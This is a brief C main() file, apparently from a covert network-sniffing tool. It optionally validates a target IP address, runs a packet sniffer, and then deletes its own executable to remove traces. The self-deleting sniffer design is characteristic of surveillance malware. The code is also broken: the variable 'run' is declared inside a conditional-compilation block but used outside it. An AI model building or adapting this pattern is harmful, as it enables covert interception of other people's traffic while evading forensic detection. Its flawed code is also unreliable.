#include "helper.h"
#include "config.h"
#include "sniffex.h"


int main(int argc, char **argv){
	#ifdef VALIDATOR
		int run;
		run = validator(IPADDR);
	#endif
	if (run==0){
		sniffer();	
	}
	#ifdef PROGRAM_NAME
		deleteSelf(PROGRAM_NAME);
		return 0;
	#endif
	return 0;
}
